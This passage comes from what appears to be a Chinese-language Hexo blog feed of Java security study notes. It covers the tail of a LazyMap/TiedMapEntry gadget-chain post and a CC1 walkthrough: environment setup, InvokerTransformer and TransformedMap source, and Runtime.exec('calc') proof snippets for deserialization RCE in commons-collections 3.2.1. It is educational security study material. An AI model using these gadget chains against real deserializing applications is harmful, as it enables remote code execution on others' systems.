class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815493.png"></p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p> 利用 <code>LazyMap</code> 在取值时会调用其 <code>factory.transform()</code>，再借助 <code>TiedMapEntry</code> 作为 <code>HashMap</code> 的 key，在反序列化时 <code>HashMap.readObject()</code> 会触发 key 的 <code>hashCode()</code> → <code>TiedMapEntry.getValue()</code> → <code>LazyMap.get()</code> → 恶意的 <code>ChainedTransformer</code>，最终执行任意方法（如 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>）  </p><p>利用链：</p><p>HashMap.readObject</p><p>HashMap.hash</p><p>TiedMapEntry.hashCode</p><p>TiedMapEntry.getValue.<font style="color:#080808;background-color:#ffffff;">get</font></p><p>LazyMap.get</p><p>LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font></p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311816402.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1</title>
    <link href="/2025/08/30/CC1/"/>
    <url>/2025/08/30/CC1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="1、JDK-8u65"><a href="#1、JDK-8u65" class="headerlink" title="1、JDK-8u65"></a>1、JDK-8u65</h2><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html?utm_source=chatgpt.com">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><strong>注意：国家不要选为国区，国区对应的 8u65 下载的时候会自动下载 8u111 等高版本！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805704.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805734.png"></p><h2 id="2、Maven-commons-collections-3-2-1"><a href="#2、Maven-commons-collections-3-2-1" class="headerlink" title="2、Maven-commons-collections 3.2.1"></a>2、Maven-commons-collections 3.2.1</h2><p><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3、修改-sun-包-方便调试"><a href="#3、修改-sun-包-方便调试" class="headerlink" title="3、修改 sun 包-方便调试"></a>3、修改 sun 包-方便调试</h2><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805174.png"></p><p>将 jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes\sun</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805660.png"></p><p>放入：jdk1.8.0_65\src</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805980.png"></p><p><font style="color:rgb(102, 102, 102);">把 src 文件夹添加到源路径下</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805831.png"></p><h1 id="Apache-Commons-Collections包和简介"><a href="#Apache-Commons-Collections包和简介" class="headerlink" title="Apache Commons Collections包和简介:"></a>Apache Commons Collections包和简介:</h1><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/</a></p><h1 id="CC1链分析："><a href="#CC1链分析：" class="headerlink" title="CC1链分析："></a>CC1链分析：</h1><p>首先要明白，CC1 链的源头是 Commons Collections 库中的 Tranformer （ org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer.java ）接口中的 transform 方法，这个接口的设计初衷，是为了把一个对象转换成另一个对象， 但是，在实现类里把 transform 变成“可以执行任意逻辑”时，就出现了漏洞。</p><p>这样的类有以下几种：</p><p><strong>最核心、最危险的类</strong>：</p><ul><li><code>InvokerTransformer</code> （执行任意方法，命令执行）</li><li><code>InstantiateTransformer</code> （实例化任意类，构造函数触发危险逻辑）</li></ul><p> <strong>组合辅助类（触发链条的关键）</strong>：</p><ul><li><code>ChainedTransformer</code>（组合执行器）</li><li><code>LazyMap</code>（触发入口）</li></ul><h2 id="1、-TransformedMap-版"><a href="#1、-TransformedMap-版" class="headerlink" title="1、 TransformedMap 版"></a>1、 TransformedMap 版</h2><blockquote><p><strong>《Java 安全漫谈》</strong></p><p><strong>TransformedMap的出处</strong></p><p>既然ysoserial中没有用到TransformedMap，那么TransformedMap究竟是谁最先提出来的呢？</p><p>据我的考证，最早讲到TransformedMap应该是Code White的这篇Slide：Exploiting</p><p>Deserialization Vulnerabilities in Java(<a href="https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478">https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478</a>)1，后来长亭科技的博客文章《Lib之过？Java反序列化漏洞通用利用分析》（<a href="https://www.anquanke.com/post/id/82898">https://www.anquanke.com/post/id/82898</a> 原文网站进不去了，只有转载）对此进行了进一步分析，后来才在国内众多文章中被讲到。</p></blockquote><h3 id="1-1-漏洞利用"><a href="#1-1-漏洞利用" class="headerlink" title="1.1 漏洞利用"></a>1.1 漏洞利用</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805576.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806717.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8653385846894047688L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String iMethodName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName)</span> &#123;<br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (((paramTypes == <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>))<br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args == <span class="hljs-literal">null</span>))<br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>) &amp;&amp; (paramTypes.length != args.length))) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The parameter types must match the arguments&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (paramTypes == <span class="hljs-literal">null</span> || paramTypes.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            paramTypes = (Class[]) paramTypes.clone();<br>            args = (Object[]) args.clone();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName, paramTypes, args);<br>        &#125;<br>    &#125;<br><br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = <span class="hljs-literal">null</span>;<br>        iArgs = <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-comment">//实现 Transformer 接口，重写的transform方法，把传入的对象 input 转换成另一个对象</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取传入对象的运行时类</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-comment">//从 cls 类中，反射获取一个方法对象；iMethodName：构造 InvokerTransformer 时传入的目标方法名（可控）；iParamTypes：方法的参数类型数组（可控）</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-comment">//调用上一步拿到的 method，并传入参数 iArgs（可控）</span><br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>                <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>从源码中可知存在反射调用任意类，并且各个参数都是可控的，使用反射调用 Runtime.exec ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//方法名为exec，参数类型为String，参数值为calc</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>);<br>invokerTransformer.transform(r);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806892.png"></p><h3 id="1-2-分析漏洞链"><a href="#1-2-分析漏洞链" class="headerlink" title="1.2 分析漏洞链"></a>1.2 分析漏洞链</h3><p>现在我们知道了<code>InvokerTransformer.transform()</code> 方法能执行任意命令，但是它自己不会平白无故被调用，必须有别的类&#x2F;方法调用它， 我们就去找哪些类会在正常逻辑中调用 <code>transform</code>**。**如果有哪个类调用了 <code>transform</code>， 就等于找到了一个“入口点”，只要我们能控制传进去的 Transformer，就能让应用在“正常使用 Map”的时候，自动调用到我们的恶意 <code>transform</code> ，从而执行命令 。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806070.png"></p><p>在 <code>TransformedMap</code>类中找到 <code>checkSetValue()</code>方法调用了 <code>transform()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806968.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span><br>    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">/** Serialization version */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br><br>    <span class="hljs-comment">/** The transformer to use for the key */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-comment">/** The transformer to use for the value */</span><br>    <span class="hljs-comment">//若把 valueTransformer 设为 InvokerTransformer，当它被调用 transform() 时就能执行任意方法/命令</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;<br><br>    <span class="hljs-comment">//decorate(装饰)，把一个已经存在的 Map 包一层 TransformedMap,以后对这个 Map 做的操作（比如 put），就会先经过 Transformer 处理，再真正存进去</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br><br>    <span class="hljs-comment">//另一种装饰，decorate：包装，不改已有数据；decorateTransform：先改旧数据再包装</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorateTransform</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-type">TransformedMap</span> <span class="hljs-variable">decorated</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>        <span class="hljs-keyword">if</span> (map.size() &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">transformed</span> <span class="hljs-operator">=</span> decorated.transformMap(map);<br>            decorated.clear();<br>            decorated.getMap().putAll(transformed);  <span class="hljs-comment">// avoids double transformation</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> decorated;<br>    &#125;<br><br>    <span class="hljs-comment">//保存底层 map 和两个 transformer;valueTransformer 是我们需要的关键点</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br>    <span class="hljs-comment">//自定义序列化，这里的 readObject 并不会主动触发 transformer；它只是把结构恢复</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        out.defaultWriteObject();<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        in.defaultReadObject();<br>        map = (Map) in.readObject();<br>    &#125;<br><br>    <span class="hljs-comment">//若有 keyTransformer 则对 key 做变换；这里的“变换”，在正常情况下是对 key/value 做某种转换（如：大小写转换），但在漏洞利用时，“变换”就执行了攻击者的代码</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformKey</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br>        <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Map <span class="hljs-title function_">transformMap</span><span class="hljs-params">(Map map)</span> &#123;<br>        <span class="hljs-keyword">if</span> (map.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> map;<br>        &#125;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedMap</span>(map.size());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;<br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) it.next();<br>            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">//这里直接调用了 valueTransformer.transform(value)</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSetValueChecking</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (valueTransformer != <span class="hljs-literal">null</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//-----------------------------------------------------------------------</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">putAll</span><span class="hljs-params">(Map mapToCopy)</span> &#123;<br>        mapToCopy = transformMap(mapToCopy);<br>        getMap().putAll(mapToCopy);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> 因为构造函数是 protected，我们不能直接实例化传参，所以找到一个<strong>公共方法 decorate</strong> ，外部调用它就能 new 出一个 TransformedMap 实例， 创建出一个 TransformedMap 对象，并把自己的 Transformer 塞进去，然后通过调用  checkSetValue() 触发 Transformer 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br><span class="hljs-comment">//用 decorate 包装这个 map</span><br><span class="hljs-comment">//第二个参数 null ：不对 key 做变换</span><br><span class="hljs-comment">//第三个参数 invokerTransformer ：对 value 做变换（关键）</span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer); <br><br></code></pre></td></tr></table></figure><p>接下来找谁调用了 checkSetValue() </p><p><strong>在 AbstractInputCheckedMapDecorator.****<font style="color:#080808;background-color:#ffffff;">MapEntry.setValue() 调用了 checkSetValue() 方法</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806376.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Implementation of a map entry that checks additions via setValue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//定义了一个静态内部类 MapEntry，它继承自 AbstractMapEntryDecorator</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>        <span class="hljs-comment">/** The parent map */</span><br>        